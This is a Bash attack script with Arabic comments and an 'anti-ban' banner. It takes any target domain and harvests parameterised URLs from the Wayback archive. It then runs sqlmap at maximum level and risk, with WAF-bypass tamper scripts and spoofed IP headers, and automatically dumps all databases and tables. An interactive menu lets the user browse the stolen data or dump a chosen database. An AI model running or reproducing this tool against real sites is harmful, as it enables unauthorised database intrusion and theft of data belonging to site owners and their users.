#!/bin/bash

# الألوان
G='\033[0;32m'
R='\033[0;31m'
Y='\033[1;33m'
C='\033[0;36m'
NC='\033[0m'

banner() {
    clear
    echo -e "${C}    ███████ ██████  ███████  █████  ██ "
    echo "    ██      ██   ██ ██      ██   ██ ██ "
    echo "    █████   ██████  ███████ ███████ ██ "
    echo "    ██      ██   ██      ██ ██   ██ ██ "
    echo "    ██      ██   ██ ███████ ██   ██ ███████ "
    echo -e "    ${Y}    INVISIBLE MODE (ANTI-BAN) | BY: FASIAL${NC}"
    echo -e "    ${G}GitHub: https://github.com/f-a2${NC}"
    echo -e "    ${R}--------------------------------------------${NC}"
}

banner
read -p "[?] Enter Target Domain: " target
[ -z "$target" ] && exit 1

# تنظيف وتحضير الروابط
echo -e "${Y}[*] Cleaning workspace and fetching URLs...${NC}"
rm -f all_urls.txt inject_this.txt final_targets.txt
waybackurls $target | grep "=" > inject_this.txt
# تصفية الروابط لاستخراج المشبوهة فقط
gf sqli inject_this.txt > final_targets.txt 2>/dev/null || cp inject_this.txt final_targets.txt

if [ ! -s final_targets.txt ]; then
    echo -e "${R}[X] No injectable URLs found!${NC}"; exit 1
fi

echo -e "${G}[+] Found $(wc -l < final_targets.txt) potential links.${NC}"
echo -e "${Y}[!] Starting Full Automated Attack (Exploit & Dump)...${NC}"

# إعدادات SQLMap الهجومية المتقدمة:
# --smart: للتركيز على المعايير المصابة فقط.
# --level 5 / --risk 3: أقصى قوة فحص (Headers, Cookies, Payload).
# --tamper: مجموعة شاملة لتخطي WAF F5 وغيره.
# --dump: سحب البيانات تلقائياً بمجرد كسر الحماية.
# --batch: عدم التوقف لسؤال المستخدم.

sqlmap -m final_targets.txt --batch --random-agent --smart \
--tamper=between,randomcase,space2comment,union2comment,equaltolike,base64encode,charencode,apostrophemask,percentage \
--header="X-Forwarded-For: 127.0.0.1" \
--header="X-Originating-IP: 127.0.0.1" \
--header="X-Real-IP: 127.0.0.1" \
--header="Client-IP: 127.0.0.1" \
--level=5 --risk=3 \
--threads=1 --delay=2 --timeout=45 \
--retries=3 \
--dbms=auto \
--dbs --tables --dump --exclude-sysdbs \
--output-dir="./results_$target"

# خوارزمية استكشاف النتائج
while true; do
    echo -e "\n${C}============================================${NC}"
    echo -e "${Y}[1] View Dumped Data | [2] Attempt Specific DB | [0] Exit${NC}"
    read -p "> " choice
    
    case $choice in
        1)
            if [ -d "./results_$target" ]; then
                echo -e "${G}[*] Exploring results folder...${NC}"
                ls -R "./results_$target"
            else
                echo -e "${R}[!] No data dumped yet.${NC}"
            fi
            ;;
        2)
            read -p "Enter DB Name: " dbname
            sqlmap -m final_targets.txt --batch --random-agent \
            -D $dbname --tables --dump --threads=1 --delay=1
            ;;
        0)
            echo -e "${G}Happy Hacking!${NC}"
            exit 0
            ;;
        *)
            echo -e "${R}Invalid choice.${NC}"
            ;;
    esac
done
